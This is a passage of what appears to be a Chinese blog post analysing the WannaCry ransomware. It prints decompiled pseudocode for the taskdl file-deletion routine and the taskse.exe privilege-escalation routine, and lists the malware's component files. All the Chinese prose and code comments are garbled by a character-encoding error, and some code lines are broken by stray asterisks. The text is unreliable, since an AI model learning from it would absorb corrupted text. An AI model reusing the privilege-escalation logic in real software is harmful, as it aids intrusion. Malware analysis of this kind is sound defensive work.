é™¤å›æ”¶ç«™å’Œä¸´æ—¶ç›®å½•ä¸‹çš„-WNCRYæ–‡ä»¶"><a href="#7-1-DeleteFile-åˆ é™¤å›æ”¶ç«™å’Œä¸´æ—¶ç›®å½•ä¸‹çš„-WNCRYæ–‡ä»¶" class="headerlink" title="7.1 DeleteFile åˆ é™¤å›æ”¶ç«™å’Œä¸´æ—¶ç›®å½•ä¸‹çš„.WNCRYæ–‡ä»¶"></a>7.1 DeleteFile åˆ é™¤å›æ”¶ç«™å’Œä¸´æ—¶ç›®å½•ä¸‹çš„.WNCRYæ–‡ä»¶</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">intÂ __cdeclÂ DeleteFile(intÂ a1)Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GetRecyclePathOrTempPath(a1,Â &amp;RecyclePath);Â Â Â </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Â è·å–å›æ”¶ç«™è·¯å¾„æˆ–è€…Cç›˜ä¸‹çš„ä¸´æ—¶æ–‡ä»¶å¤¹è·¯å¾„Â Â </span><br><span class="line"></span><br><span class="line">swprintf(&amp;String,Â (size_t)aSS,Â &amp;RecyclePath,Â aWncryt);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Â string&#x3D;å›æ”¶ç«™è·¯å¾„æˆ–ä¸´æ—¶æ–‡ä»¶å¤¹è·¯å¾„+*.WNCRYTÂ Â Â </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Â Â Â </span><br><span class="line"></span><br><span class="line">hFileÂ &#x3D;Â FindFirstFileW(&amp;String,Â &amp;FindFileData);&#x2F;&#x2F;åœ¨å›æ”¶ç«™æŸ¥æ‰¾æ‰€æœ‰.WNCRYTç»“å°¾çš„æ–‡ä»¶Â Â </span><br><span class="line"></span><br><span class="line">ifÂ (Â hFileÂ &#x3D;&#x3D;Â (HANDLE)-1Â )Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â &#x2F;&#x2F;Â å¦‚æœæ²¡æ‰¾åˆ°ç›´æ¥è¿”å›Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">v2Â &#x3D;Â (charÂ *)Memory;Â Â </span><br><span class="line"></span><br><span class="line">v24Â &#x3D;Â -1;Â Â </span><br><span class="line"></span><br><span class="line">ifÂ (Â MemoryÂ !&#x3D;Â v17Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">doÂ Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">std::basic_string&lt;unsignedÂ short,std::char_traits&lt;unsignedÂ short&gt;,std::allocator&lt;unsignedÂ short&gt;&gt;::~basic_string&lt;unsignedÂ short,std::char_traits&lt;unsignedÂ short&gt;,std::allocator&lt;unsignedÂ short&gt;&gt;(Â Â </span><br><span class="line"></span><br><span class="line">v2,Â Â </span><br><span class="line"></span><br><span class="line">0);Â Â </span><br><span class="line"></span><br><span class="line">v2Â +&#x3D;Â 16;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">whileÂ (Â v2Â !&#x3D;Â v17Â );Â Â </span><br><span class="line"></span><br><span class="line">v2Â &#x3D;Â (charÂ *)Memory;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">FreeMem(v2);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â &#x2F;&#x2F;Â é‡Šæ”¾å†…å­˜Â Â </span><br><span class="line"></span><br><span class="line">resultÂ &#x3D;Â 0;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">elseÂ Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">doÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â &#x2F;&#x2F;Â å¦‚æœæ‰¾åˆ°äº†Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">swprintf(&amp;String,Â (size_t)aSS_0,Â &amp;RecyclePath,Â FindFileData.cFileName);&#x2F;&#x2F;Â æ‹¼æ¥ç›®æ ‡æ–‡ä»¶çš„å®Œæ•´è·¯å¾„Â Â </span><br><span class="line"></span><br><span class="line">v19Â &#x3D;Â v13;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â &#x2F;&#x2F;Â æ¸…ç©ºstringså¯¹è±¡çš„å†…å­˜Â Â </span><br><span class="line"></span><br><span class="line">std::basic_string&lt;unsignedÂ short,std::char_traits&lt;unsignedÂ short&gt;,std::allocator&lt;unsignedÂ short&gt;&gt;::_Tidy(&amp;v19,Â 0);Â Â </span><br><span class="line"></span><br><span class="line">TargetFullPathLenÂ &#x3D;Â wcslen(&amp;String);Â Â Â Â Â Â &#x2F;&#x2F;Â è·å–ç›®æ ‡æ–‡ä»¶å®Œæ•´è·¯å¾„çš„é•¿åº¦Â Â </span><br><span class="line"></span><br><span class="line">ifÂ (Â (unsignedÂ __int8)std::basic_string&lt;unsignedÂ short,std::char_traits&lt;unsignedÂ short&gt;,std::allocator&lt;unsignedÂ short&gt;&gt;::_Grow(Â Â </span><br><span class="line"></span><br><span class="line">&amp;v19,Â Â </span><br><span class="line"></span><br><span class="line">TargetFullPathLen,Â Â </span><br><span class="line"></span><br><span class="line">1)Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">wmemcpy(TargetFullPath,Â &amp;String,Â TargetFullPathLen);&#x2F;&#x2F;Â æ‹·è´ç›®æ ‡è·¯å¾„Â Â </span><br><span class="line"></span><br><span class="line">std::basic_string&lt;unsignedÂ short,std::char_traits&lt;unsignedÂ short&gt;,std::allocator&lt;unsignedÂ short&gt;&gt;::_Eos(Â Â </span><br><span class="line"></span><br><span class="line">&amp;v19,Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â &#x2F;&#x2F;Â å°†ç›®æ ‡æ–‡ä»¶è·¯å¾„å’Œé•¿åº¦å†™å…¥åˆ°å®¹å™¨Â Â </span><br><span class="line"></span><br><span class="line">TargetFullPathLen);Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">LOBYTE(v24)Â &#x3D;Â 1;Â Â </span><br><span class="line"></span><br><span class="line">sub_4013D0(&amp;v15,Â (int)v17,Â 1u,Â (int)&amp;v19);&#x2F;&#x2F;Â è¿™ä¸ªå‡½æ•°ä¼šæŠŠä¹‹å‰çš„Stringå¯¹è±¡æ”¾åˆ°å¦ä¸€ä¸ªå®¹å™¨é‡ŒÂ Â </span><br><span class="line"></span><br><span class="line">LOBYTE(v24)Â &#x3D;Â 0;Â Â </span><br><span class="line"></span><br><span class="line">std::basic_string&lt;unsignedÂ short,std::char_traits&lt;unsignedÂ short&gt;,std::allocator&lt;unsignedÂ short&gt;&gt;::_Tidy(&amp;v19,Â 1);Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">whileÂ (Â FindNextFileW(hFile,Â &amp;FindFileData)Â );Â Â </span><br><span class="line"></span><br><span class="line">FindClose(hFile);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â &#x2F;&#x2F;Â æ–‡ä»¶éå†ç»“æŸÂ Â </span><br><span class="line"></span><br><span class="line">v5Â &#x3D;Â 0;Â Â </span><br><span class="line"></span><br><span class="line">forÂ (Â iÂ &#x3D;Â 0;Â ;Â iÂ +&#x3D;Â 16Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">v7Â &#x3D;Â (charÂ *)Memory;Â Â </span><br><span class="line"></span><br><span class="line">ifÂ (Â !MemoryÂ ||Â v5Â &gt;&#x3D;Â (v17Â -Â (_BYTEÂ *)Memory)Â &gt;&gt;Â 4Â )Â Â </span><br><span class="line"></span><br><span class="line">break;Â Â </span><br><span class="line"></span><br><span class="line">TargetFullPath_1Â &#x3D;Â *(constÂ WCHARÂ )((charÂ *)MemoryÂ +Â iÂ +Â 4);Â Â </span><br><span class="line"></span><br><span class="line">ifÂ (Â !TargetFullPath_1Â )Â Â </span><br><span class="line"></span><br><span class="line">TargetFullPath_1Â &#x3D;Â (constÂ WCHARÂ *)&#96;std::basic_string&lt;unsignedÂ short,std::char_traits&lt;unsignedÂ short&gt;,std::allocator&lt;unsignedÂ short&gt;&gt;::_Nullstr&#39;::&#96;2&#39;::_C;Â Â </span><br><span class="line"></span><br><span class="line">ifÂ (Â DeleteFileW(TargetFullPath_1)Â )Â Â Â Â Â Â &#x2F;&#x2F;Â åˆ é™¤ç›®æ ‡æ–‡ä»¶Â Â </span><br><span class="line"></span><br><span class="line">++v14;Â Â </span><br><span class="line"></span><br><span class="line">++v5;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">v9Â &#x3D;Â (charÂ *)Memory;Â Â </span><br><span class="line"></span><br><span class="line">v10Â &#x3D;Â v17;Â Â </span><br><span class="line"></span><br><span class="line">v11Â &#x3D;Â (charÂ *)Memory;Â Â </span><br><span class="line"></span><br><span class="line">ifÂ (Â MemoryÂ !&#x3D;Â v17Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">doÂ Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">std::basic_string&lt;unsignedÂ short,std::char_traits&lt;unsignedÂ short&gt;,std::allocator&lt;unsignedÂ short&gt;&gt;::_Tidy(v11,Â 1);Â Â </span><br><span class="line"></span><br><span class="line">v11Â +&#x3D;Â 16;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">whileÂ (Â v11Â !&#x3D;Â v10Â );Â Â </span><br><span class="line"></span><br><span class="line">v7Â &#x3D;Â (charÂ *)Memory;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">v17Â &#x3D;Â v9;Â Â </span><br><span class="line"></span><br><span class="line">v24Â &#x3D;Â -1;Â Â </span><br><span class="line"></span><br><span class="line">v12Â &#x3D;Â v7;Â Â </span><br><span class="line"></span><br><span class="line">ifÂ (Â v7Â !&#x3D;Â v9Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">doÂ Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â &#x2F;&#x2F;Â å¾ªç¯æ¸…ç©ºæ¯ä¸€ä¸ªå®¹å™¨é‡Œçš„å†…å®¹Â Â </span><br><span class="line"></span><br><span class="line">std::basic_string&lt;unsignedÂ short,std::char_traits&lt;unsignedÂ short&gt;,std::allocator&lt;unsignedÂ short&gt;&gt;::_Tidy(v12,Â 1);Â Â </span><br><span class="line"></span><br><span class="line">v12Â +&#x3D;Â 16;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">whileÂ (Â v12Â !&#x3D;Â v9Â );Â Â </span><br><span class="line"></span><br><span class="line">v7Â &#x3D;Â (charÂ *)Memory;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">FreeMem(v7);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â &#x2F;&#x2F;Â é‡Šæ”¾å†…å­˜Â Â </span><br><span class="line"></span><br><span class="line">resultÂ &#x3D;Â v14;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">returnÂ result;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br></pre></td></tr></table></figure><ul><li><p>é¦–å…ˆï¼Œè¯¥å‡½æ•°åˆ©ç”¨äº† GetRecyclePathOrTempPah å‡½æ•°è·å¾—äº† å›æ”¶ç«™D:/$RECYCLE å’Œç³»ç»Ÿç›˜å†å²æ–‡ä»¶å¤¹çš„è·¯å¾„C:UsersDingisoAppDataLocalTemp è¿™ä¸¤ä¸ªåœ°å€</p></li><li><p>  ç„¶åå‡½æ•°ä¼šå¾ªç¯ä¸¤æ¬¡ï¼Œåˆ¤æ–­æ˜¯å¦ç³»ç»Ÿä¸­å­˜åœ¨å…¶ä»–çš„ç›˜ç¬¦ã€‚</p></li><li><p>  æ¥ç€å‡½æ•°åˆ©ç”¨FindFirstWå‡½æ•°æŸ¥æ‰¾ç›®æ ‡æ–‡ä»¶å¤¹ä¸­æ‰€æœ‰çš„ä»¥.WNCRYTç»“å°¾çš„æ–‡ä»¶</p></li><li><p>  å‡½æ•°ä¼šå°†ä»–éå†çš„æ‰€æœ‰çš„.WNCRYTæ–‡ä»¶çš„å®Œæ•´è·¯å¾„å’Œé•¿åº¦å­˜å‚¨åˆ°ä¸€ä¸ªå®¹å™¨ä¸­</p></li><li><p>  å½“æ–‡ä»¶éå†ç»“æŸ ä¼šè°ƒç”¨DeleteFileW åˆ é™¤æ‰€æœ‰å®¹å™¨ä¸­è®°å½•çš„é¡¹</p></li><li><p>  æœ€å å¾ªç¯å°†å­˜æ”¾æ–‡ä»¶çš„å®Œæ•´è·¯å¾„å’Œé•¿åº¦çš„å®¹å™¨æ¸…ç©º ï¼Œé‡Šæ”¾èµ„æº</p></li></ul><h1 id="8-taskse-exe-ç—…æ¯’è¾…åŠ©æ–‡ä»¶åˆ†æ"><a href="#8-taskse-exe-ç—…æ¯’è¾…åŠ©æ–‡ä»¶åˆ†æ" class="headerlink" title="8 taskse.exe ç—…æ¯’è¾…åŠ©æ–‡ä»¶åˆ†æ"></a>8 taskse.exe ç—…æ¯’è¾…åŠ©æ–‡ä»¶åˆ†æ</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span>Â <span class="keyword">int</span>Â __cdeclÂ <span class="title">sub_401000</span><span class="params">(<span class="keyword">int</span>Â argv,Â <span class="keyword">int</span>Â a2,Â __int16Â Num_5,Â <span class="keyword">int</span>Â Num_0)</span>Â Â </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;Â Â </span><br><span class="line"></span><br><span class="line">Advapi32BaseÂ =Â GetModuleHandleA(LibFileName);Â <span class="comment">//Â è·å–advapi32.dllå¥æŸ„Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !Advapi32BaseÂ )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">Advapi32BaseÂ =Â LoadLibraryA(LibFileName);Â Â Â <span class="comment">//Â åŠ è½½advapi32.dllÂ Â </span></span><br><span class="line"></span><br><span class="line">*</span><br><span class="line"></span><br><span class="line">kernel32BaseÂ =Â GetModuleHandleA(kernel32);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !kernel32BaseÂ )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">kernel32BaseÂ =Â LoadLibraryA(kernel32);Â Â Â Â Â Â <span class="comment">//Â åŠ è½½kernel32.dllÂ Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !kernel32BaseÂ )Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">-1</span>;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">hProcessÂ =Â ((<span class="keyword">int</span>Â (__stdcallÂ *)(<span class="keyword">signed</span>Â <span class="keyword">int</span>,Â <span class="keyword">void</span>Â ))GetCurrentProcess_Addr)(<span class="number">40</span>,Â &amp;TokenHandle);<span class="comment">//Â è·å–å½“å‰è¿›ç¨‹çš„ä¼ªå¥æŸ„Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !((<span class="keyword">int</span>Â (__stdcallÂ *)(<span class="keyword">int</span>))OpenProcessToken_Addr)(hProcess)Â )<span class="comment">//Â ä»¥ä¿®æ”¹æƒé™çš„æ–¹å¼Â æ‰“å¼€è¿›ç¨‹çš„ä»¤ç‰ŒÂ Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span>Â LABEL_55;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !((<span class="keyword">int</span>Â (__stdcallÂ *)(_DWORD,Â <span class="keyword">char</span>Â *,Â <span class="keyword">int</span>Â *))LookupPrivilegeValueA_Addr)(<span class="number">0</span>,Â aSetcbprivilege,Â &amp;lpLuid)Â )<span class="comment">//Â è·å¾—LUIDÂ Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">local_unwind2((<span class="keyword">int</span>)&amp;ms_exc.registration,Â <span class="number">-1</span>);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">-1</span>;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">NewStateÂ =Â <span class="number">1</span>;Â Â </span><br><span class="line"></span><br><span class="line">lpLuid_1Â =Â lpLuid;Â Â </span><br><span class="line"></span><br><span class="line">v18Â =Â v27;Â Â </span><br><span class="line"></span><br><span class="line">v19Â =Â <span class="number">2</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !((<span class="keyword">int</span>Â (__stdcallÂ *)(<span class="keyword">void</span>Â *,Â _DWORD,Â <span class="keyword">int</span>Â *,Â <span class="keyword">signed</span>Â <span class="keyword">int</span>,Â <span class="keyword">int</span>Â *,Â <span class="keyword">char</span>Â *))AdjustTokenPrivileges_Addr)(Â Â </span><br><span class="line"></span><br><span class="line">TokenHandle,Â Â </span><br><span class="line"></span><br><span class="line"><span class="number">0</span>,Â Â </span><br><span class="line"></span><br><span class="line">&amp;NewState,Â Â </span><br><span class="line"></span><br><span class="line"><span class="number">0x10</span>,Â Â </span><br><span class="line"></span><br><span class="line">&amp;PreviousState,Â Â </span><br><span class="line"></span><br><span class="line">&amp;ReturnLength)Â )Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â æå‡å½“å‰æƒé™Â Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">*Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !((<span class="keyword">int</span>Â (__stdcallÂ *)(<span class="keyword">int</span>,Â <span class="keyword">void</span>Â ))WTSQueryUserToken_Addr)(SessionId,Â &amp;phToken)Â )<span class="comment">//Â è·å–ç”¨æˆ·çš„è®¿é—®ä»¤ç‰ŒÂ Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">local_unwind2((<span class="keyword">int</span>)&amp;ms_exc.registration,Â <span class="number">-1</span>);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">-1</span>;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !((<span class="keyword">int</span>Â (__stdcallÂ *)(<span class="keyword">void</span>Â *,Â <span class="keyword">signed</span>Â <span class="keyword">int</span>,Â _DWORD,Â <span class="keyword">signed</span>Â <span class="keyword">int</span>,Â <span class="keyword">signed</span>Â <span class="keyword">int</span>,Â <span class="keyword">void</span>Â ))DuplicateTokenEx_Addr)(<span class="comment">//Â åˆ›å»ºä¸€ä¸ªæ–°çš„è®¿é—®ä»¤ç‰ŒÂ Â </span></span><br></pre></td></tr></table></figure><p>è¯¥æ–‡ä»¶çš„ä¸»è¦ä½œç”¨æ˜¯ææƒï¼Œä¸»è¦é€»è¾‘å¦‚ä¸‹ï¼š</p><ul><li><p>  è·å–å¿…è¦APIå‡½æ•°åœ°å€</p></li><li><p>  æä¸Šå½“å‰çš„æƒé™</p></li><li><p>  è·å–å½“å‰ç”¨æˆ·çš„è®¿é—®ä»¤ç‰Œå¹¶åˆ›å»ºä¸€ä¸ªæ–°çš„è®¿é—®ä»¤ç‰Œ</p></li><li><p>  æœ€åå†æ¬¡æå‡æƒé™</p></li></ul><h1 id="9-WannaCry-ç—…æ¯’åˆ†ææ€»ç»“"><a href="#9-WannaCry-ç—…æ¯’åˆ†ææ€»ç»“" class="headerlink" title="9 WannaCry ç—…æ¯’åˆ†ææ€»ç»“"></a>9 WannaCry ç—…æ¯’åˆ†ææ€»ç»“</h1><p>è¯¥ç—…æ¯’æ¶‰åŠçš„ç›¸å…³æ–‡ä»¶åŠä½œç”¨å¦‚ä¸‹ï¼š</p><ul><li><p>  msg ç—…æ¯’çš„è¯­è¨€åŒ…</p></li><li><p>  c.wnry å­˜å‚¨äº†æ¯”ç‰¹å¸è´¦æˆ· ä¸€ä¸ªä¸‹è½½é“¾æ¥ è·Ÿå‹’ç´¢ç›¸å…³</p></li><li><p>  t.wnry éšè—äº†ä¸€ä¸ªdllæ–‡ä»¶ dllçš„å¯¼å‡ºå‡½æ•°æ˜¯ç—…æ¯’çš„æ ¸å¿ƒä»£ç </p></li><li><p>  u.wnry è§£å¯†å™¨</p></li><li><p>  r.wrny å‹’ç´¢æ–‡æ¡£</p></li><li><p>  @WanaDecryptor@.exe è§£å¯†å™¨</p></li><li><p>  taskse.exe ææƒ</p></li><li><p>  taskdl.exe åˆ é™¤ä¸´æ—¶æ–‡ä»¶å’Œå›æ”¶ç«™çš„.WNCRYæ–‡ä»¶</p></li><li><p>  00000000.pky å…¬é’¥</p></li><li><p>  00000000.eky è¢«åŠ å¯†çš„ç§é’¥</p></li><li><p>  00000000.res å…«ä¸ªå­—èŠ‚çš„éšæœºæ•°å’Œå½“å‰æ—¶é—´</p></li><li><p>  .batä¸ºè§£å¯†å™¨åˆ›å»ºå¿«æ·æ–¹å¼</p></li></ul><p>é™„ä¸Šç—…æ¯’è¡Œä¸ºçš„æ€»ç»“å›¾è¡¨ï¼š</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image20.png" class="" width="20"><h1 id="10-ç—…æ¯’é¢„é˜²åŠæ€æ¯’æ–¹æ¡ˆï¼š"><a href="#10-ç—…æ¯’é¢„é˜²åŠæ€æ¯’æ–¹æ¡ˆï¼š" class="headerlink" title="10 ç—…æ¯’é¢„é˜²åŠæ€æ¯’æ–¹æ¡ˆï¼š"></a>10 ç—…æ¯’é¢„é˜²åŠæ€æ¯’æ–¹æ¡ˆï¼š</h1><ol><li><p> 